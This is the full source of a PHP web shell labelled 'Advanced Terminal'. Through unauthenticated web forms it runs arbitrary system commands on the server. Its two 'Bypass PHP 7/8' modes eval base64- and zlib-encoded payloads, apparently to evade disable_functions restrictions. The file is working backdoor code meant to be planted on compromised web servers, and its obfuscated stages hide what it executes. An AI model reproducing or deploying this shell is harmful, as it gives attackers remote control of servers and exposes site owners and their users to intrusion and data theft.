<?php

$nm   = 'user';
$serv = gethostname();

$activeBox = '';
$contentNormal = '';
if (isset($_POST['normalcmd']) && isset($_POST['command'])) {
    $command = $_POST['command'];
    $activeBox = 'normalBox';

    ob_start();
    echo "Execution Result (Normal):\n\n";

    $descriptors = [
        0 => ["pipe","r"], 
        1 => ["pipe","w"], 
        2 => ["pipe","w"],
    ];
    $process = @proc_open($command, $descriptors, $pipes);

    if (is_resource($process)) {
        fwrite($pipes[0], "y\n");
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        $error  = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $status = proc_close($process);

        echo $output;
        if ($error) {
            echo "\n[ERROR]\n" . $error;
        }
    } else {
        echo "Failed to open process.";
    }

    $contentNormal = ob_get_clean();
}

$content7 = '';
if (!empty($_POST['cmd7'])) {
    $x = $_POST['cmd7'];
    $activeBox = 'php7Box'; 

    ob_start();
    echo "Execution Result (Bypass PHP 7):\n\n";
    echo $nm."@".$serv.": ~\$ ".$x."\n\n";

    $reqex = "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";
    @eval("?>".gzuncompress(base64_decode($reqex)));

    $content7 = ob_get_clean();
}

$content8 = '';
if (!empty($_POST['cmd8'])) {
    $x = $_POST['cmd8'];
    $activeBox = 'php8Box';

    ob_start();
    echo "Execution Result (Bypass PHP 8):\n\n";
    echo $nm."@".$serv.": ~\$ ".$x."\n\n";
    $reqex = "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";
    @eval("?>".gzuncompress(base64_decode($reqex)));

    $content8 = ob_get_clean();
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Tiga Terminal - Show/Hide (Output in Textarea)</title>
    <style>
    body {
      margin:0; padding:0;
      background:#1e1e1e; 
      color:#fff; 
      font-family:sans-serif;
    }
    header {
      background:#111; 
      padding:10px 20px; 
      border-bottom:3px solid #f70; 
      display:flex; 
      align-items:center;
    }
    header h1 {
      margin:0; 
      font-size:1.2em; 
      color:#f70;
    }
    .container { padding:20px; }
    .menu-bar button {
      background:#f70; 
      color:#111; 
      border:none; 
      padding:8px 16px; 
      cursor:pointer; 
      border-radius:4px; 
      font-weight:bold;
      margin-right:10px;
      margin-bottom:10px;
    }
    .menu-bar button:hover {
      background:#ffa500;
    }
    .term-box {
      display:none;
      background:#282828;
      border:2px solid #f70;
      border-radius:6px;
      padding:20px;
      margin-bottom:20px;
    }
    .term-box h2 {
      color:#f70;
      margin-top:0;
    }
    label { font-weight:bold; }
    input[type=text] {
      width:100%;
      background:#333; 
      border:1px solid #444; 
      color:#fff; 
      border-radius:4px; 
      padding:8px;
      margin-bottom:8px;
    }
    .btn-submit {
      background:#f70; 
      color:#111; 
      border:none; 
      padding:8px 16px; 
      cursor:pointer; 
      border-radius:4px; 
      font-weight:bold;
      margin-right:10px;
      margin-top:5px;
    }
    .btn-submit:hover {
      background:#ffa500;
    }
    textarea.output-area {
      width:100%;
      height:200px;
      background:#1e1e1e;
      border:1px solid #444;
      border-radius:6px;
      color:#fff;
      padding:10px;
      font-family:monospace;
      margin-top:5px;
      white-space:pre;
      overflow:auto;
      resize:vertical;
    }
    </style>
</head>
<body>
<header>
  <h1>Advanced Terminal</h1>
</header>

<div class="container">
  <div class="menu-bar">
    <button type="button" onclick="showTerminal('normalBox')">Terminal Biasa</button>
    <button type="button" onclick="showTerminal('php7Box')">Terminal Bypass PHP 7</button>
    <button type="button" onclick="showTerminal('php8Box')">Terminal Bypass PHP 8</button>
  </div>

  <div id="normalBox" class="term-box">
    <h2>Terminal Biasa</h2>
    <form method="post">
      <label>Enter command (Normal):</label>
      <input type="text" name="command" placeholder="ls -la">
      <input type="submit" name="normalcmd" class="btn-submit" value="Run Normal">
    </form>

    <?php if ($contentNormal): ?>
      <h3>Execution Result (Normal):</h3>
      <textarea class="output-area" readonly><?php echo htmlspecialchars($contentNormal); ?></textarea>
    <?php endif; ?>
  </div>

  <div id="php7Box" class="term-box">
    <h2>Terminal Bypass PHP 7</h2>
    <form method="post">
      <label>Enter command (Bypass 7):</label>
      <input type="text" name="cmd7" placeholder="ls -la">
      <input type="submit" class="btn-submit" value="Run Bypass 7">
    </form>

    <?php if ($content7): ?>
      <h3>Execution Result (Bypass PHP 7):</h3>
      <textarea class="output-area" readonly><?php echo htmlspecialchars($content7); ?></textarea>
    <?php endif; ?>
  </div>

  <div id="php8Box" class="term-box">
    <h2>Terminal Bypass PHP 8</h2>
    <form method="post">
      <label>Enter command (Bypass 8):</label>
      <input type="text" name="cmd8" placeholder="ls -la">
      <input type="submit" class="btn-submit" value="Run Bypass 8">
    </form>

    <?php if ($content8): ?>
      <h3>Execution Result (Bypass PHP 8):</h3>
      <textarea class="output-area" readonly><?php echo htmlspecialchars($content8); ?></textarea>
    <?php endif; ?>
  </div>
</div>

<script>
function showTerminal(id) {
  document.getElementById('normalBox').style.display = 'none';
  document.getElementById('php7Box').style.display  = 'none';
  document.getElementById('php8Box').style.display  = 'none';

  document.getElementById(id).style.display = 'block';
}

document.addEventListener('DOMContentLoaded', function(){
   var active = '<?php echo $activeBox; ?>';
   if (active) {
      showTerminal(active);
   }
});
</script>

</body>
</html>
